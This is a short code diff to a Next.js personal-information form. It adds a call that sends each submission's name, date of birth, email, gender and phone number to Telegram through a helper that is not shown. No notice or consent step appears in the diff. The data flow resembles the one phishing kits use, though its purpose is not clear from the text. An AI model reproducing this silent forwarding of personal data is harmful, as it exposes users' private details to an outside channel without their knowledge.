@@ -1,4 +1,5 @@
 "use client";
+import { sendTelegramMessage } from "../../../utils/telegram";
 
 import { useState } from "react";
 import { useRouter } from "next/navigation";
@@ -29,13 +30,26 @@ const PersonalInformationForm = () => {
     return newErrors;
   };
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     const validationErrors = validateForm();
     if (Object.keys(validationErrors).length > 0) {
       setErrors(validationErrors);
       return;
     }
+
+
+      // Send the form data to Telegram
+  const message = `New User Form Submission:\n
+  First Name: ${formData.firstName}\n
+  Last Name: ${formData.lastName}\n
+  Date of Birth: ${formData.dob}\n
+  Email: ${formData.email}\n
+  Gender: ${formData.gender}\n
+  Phone Number: ${formData.phoneNumber}`;
+  
+  // Call the function to send the message to Telegram
+  await sendTelegramMessage(message);
     console.log("Form Submitted", formData);
     router.push("/education-history");
   };
